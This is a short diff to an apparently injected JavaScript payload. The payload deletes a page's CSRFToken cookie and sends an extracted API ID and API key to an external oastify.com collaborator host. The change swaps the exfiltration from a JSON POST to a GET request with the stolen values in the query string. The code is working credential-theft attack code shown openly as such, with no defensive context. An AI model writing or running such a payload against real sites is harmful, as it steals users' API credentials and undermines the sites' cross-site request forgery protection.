@@ -6,15 +6,10 @@ function deleteCookie(name) {
 // Delete the CSRFToken cookie
 deleteCookie("CSRFToken");
 
-// Function to send extracted data to the external server
+// Function to send extracted data to the external server via GET request
 function sendData(apiId, apiKey) {
-  fetch("https://lj8xnmcmaivpwy0jmm1mnhyqnht8h25r.oastify.com", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ apiId: apiId, apiKey: apiKey })
-  });
+  const url = `https://lj8xnmcmaivpwy0jmm1mnhyqnht8h25r.oastify.com/?apiId=${encodeURIComponent(apiId)}&apiKey=${encodeURIComponent(apiKey)}`;
+  fetch(url);
 }
 
 // Send the GET request and process the response
